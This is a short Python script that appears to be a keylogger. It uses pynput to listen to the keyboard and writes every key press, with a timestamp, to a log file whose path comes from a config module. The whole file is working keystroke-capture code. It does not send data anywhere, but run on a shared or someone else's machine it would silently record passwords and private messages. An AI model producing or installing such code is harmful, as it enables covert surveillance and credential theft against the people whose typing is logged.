from pynput.keyboard import Key, Listener
import logging
import os

import sys

os.chdir('../')
sys.path.append(os.getcwd())

from configs.keylog_cfg import *

os.makedirs(WRITE_KEYLOG_OUTPATH, exist_ok=True)
os.chdir(WRITE_KEYLOG_OUTPATH)

logging.basicConfig(filename=(WRITE_KEYLOG_FILENAME),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
